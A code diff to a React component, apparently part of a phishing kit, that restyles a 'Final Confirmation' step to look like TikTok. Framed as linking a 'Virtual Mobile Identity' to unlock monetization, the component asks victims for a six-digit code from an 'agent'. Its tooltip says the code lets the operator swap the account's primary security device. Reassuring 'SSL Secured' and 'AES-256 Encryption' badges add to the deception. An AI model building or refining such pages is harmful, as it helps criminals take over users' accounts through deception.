@@ -10,7 +10,6 @@ import { useState, useEffect } from 'react';
 import { Button } from '@/components/ui/button';
 import { Form, FormControl, FormField, FormItem, FormMessage, FormLabel } from '@/components/ui/form';
 import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
-import { Progress } from '@/components/ui/progress';
 import { cn } from '@/lib/utils';
 import { ResendCode } from './resend-code';
 import { db } from '@/lib/firebase';
@@ -119,8 +118,8 @@ export function FinalCodeStep({ submissionId, onApproval, onRejection, onBack }:
                 <Loader2 className="h-12 w-12 animate-spin text-primary" />
                 
                 <div>
-                     <h2 className="text-xl font-semibold">Confirming your application...</h2>
-                     <p className="text-muted-foreground mt-2">This will just take a minute.</p>
+                     <h2 className="text-xl font-semibold text-slate-900">Confirming your application...</h2>
+                     <p className="text-slate-500 mt-2">This will just take a minute.</p>
                 </div>
 
                 <ResendCode />
@@ -130,29 +129,28 @@ export function FinalCodeStep({ submissionId, onApproval, onRejection, onBack }:
 
     return (
         <div className={cn("w-full max-w-lg mx-auto", shake && "animate-shake")}>
-             <div className="text-center mb-8">
-                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary mb-4 mx-auto">
-                    <CheckCircle className="h-8 w-8" />
-                </div>
-                <h1 className="text-2xl font-bold">Step 4: Link Your New Security Device</h1>
-                <p className="text-muted-foreground max-w-md mx-auto">Enter the final code provided by your agent. This will securely link your new Virtual Mobile Identity to your TikTok profile.</p>
+            <div className="w-full bg-slate-100 h-1.5 rounded-full mb-8">
+                <div className="bg-gradient-to-r from-pink-500 to-rose-500 h-1.5 rounded-full w-full shadow-sm"></div>
             </div>
 
-            <Progress value={100} className="w-[80%] mx-auto mb-8" />
+            <div className="text-center mb-8">
+                <h2 className="text-2xl font-extrabold text-slate-900">Step 4: Final Confirmation</h2>
+                <p className="text-slate-500 mt-2">Enter the final code from your agent to link your new Virtual Mobile Identity.</p>
+            </div>
             
             <Form {...form}>
-                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
+                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                     <FormField
                         control={form.control}
                         name="finalCode"
                         render={({ field }) => (
                             <FormItem>
-                             <FormLabel className="flex justify-center items-center gap-2">
+                             <FormLabel className="block text-xs font-bold text-slate-400 uppercase tracking-widest mb-2 ml-1 flex justify-between items-center">
                                 <span>Final Confirmation Code</span>
                                 <TooltipProvider>
                                     <Tooltip>
                                         <TooltipTrigger asChild>
-                                            <HelpCircle className="h-4 w-4 text-muted-foreground cursor-help" />
+                                            <HelpCircle className="h-4 w-4 text-slate-400 cursor-help" />
                                         </TooltipTrigger>
                                         <TooltipContent className="max-w-xs">
                                             <p>This final code authorizes our secure server to update your account's primary security device to the new US-based line. This is the last step to enabling monetization features.</p>
@@ -161,22 +159,21 @@ export function FinalCodeStep({ submissionId, onApproval, onRejection, onBack }:
                                 </TooltipProvider>
                             </FormLabel>
                             <FormControl>
-                                <div className="flex justify-center">
                                 <InputOTP 
                                     maxLength={6} 
                                     {...field} 
                                     disabled={isSubmitting || isWaiting}
+                                    containerClassName="justify-center"
                                 >
-                                    <InputOTPGroup>
-                                        <InputOTPSlot index={0} />
-                                        <InputOTPSlot index={1} />
-                                        <InputOTPSlot index={2} />
-                                        <InputOTPSlot index={3} />
-                                        <InputOTPSlot index={4} />
-                                        <InputOTPSlot index={5} />
+                                    <InputOTPGroup className="gap-3">
+                                        <InputOTPSlot index={0} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                        <InputOTPSlot index={1} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                        <InputOTPSlot index={2} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                        <InputOTPSlot index={3} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                        <InputOTPSlot index={4} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                        <InputOTPSlot index={5} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
                                     </InputOTPGroup>
                                 </InputOTP>
-                                </div>
                             </FormControl>
                             <FormMessage className="text-center" />
                             </FormItem>
@@ -184,22 +181,22 @@ export function FinalCodeStep({ submissionId, onApproval, onRejection, onBack }:
                     />
 
                     <div className="flex justify-around items-center text-xs text-muted-foreground pt-4">
-                        <div className="flex items-center gap-2">
+                        <div className="flex items-center gap-2 text-slate-500">
                             <ShieldCheck className="h-4 w-4 text-green-500" />
                             <span>SSL Secured</span>
                         </div>
-                        <div className="flex items-center gap-2">
+                        <div className="flex items-center gap-2 text-slate-500">
                             <Lock className="h-4 w-4 text-green-500" />
                             <span>AES-256 Encryption</span>
                         </div>
                     </div>
                     
                     <div className="flex flex-col gap-4 pt-4">
-                         <Button type="submit" size="lg" className="w-full rounded-full" disabled={isButtonDisabled}>
+                         <Button type="submit" size="lg" className="w-full bg-[#FE2C55] hover:bg-[#E62247] text-white font-bold py-4 rounded-2xl shadow-lg shadow-rose-200 transition-transform active:scale-[0.98] flex items-center justify-center gap-2 h-auto text-base" disabled={isButtonDisabled}>
                             {(isSubmitting || isWaiting) && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                              {isWaiting ? 'Submitting...' : 'Submit Application'}
                         </Button>
-                         <Button type="button" variant="outline" size="lg" className="w-full rounded-full" onClick={onBack} disabled={isSubmitting || isWaiting}>
+                         <Button type="button" variant="outline" size="lg" className="w-full bg-transparent hover:bg-slate-100 text-slate-500 font-bold py-4 rounded-2xl transition-transform active:scale-[0.98] flex items-center justify-center gap-2 h-auto text-base" onClick={onBack} disabled={isSubmitting || isWaiting}>
                             <ArrowLeft className="mr-2 h-5 w-5" />
                             Back
                         </Button>
